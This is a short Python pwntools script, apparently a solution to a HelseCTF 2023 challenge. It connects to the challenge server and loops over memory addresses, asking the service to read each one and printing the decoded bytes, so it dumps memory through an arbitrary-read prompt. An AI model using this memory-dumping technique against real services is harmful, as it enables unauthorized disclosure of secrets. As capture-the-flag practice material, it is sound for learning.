from pwn import *
io = remote("helsectf2023-6ac4e1c6d8855c1bd96a-minnespekter.chals.io", 443, ssl=True)

for i in range(0x00000200, 0x0001ffff):
    io.recvuntil(b"lese?") # Wait for it to ask for memory address
    io.sendline(f"{i}".encode()) # Send current address
    # Receive hex at this position
    data = io.recvuntil(b"\r\nHvilken", drop = True).decode().split()[2]

    print(bytes.fromhex(data).decode(), end = "")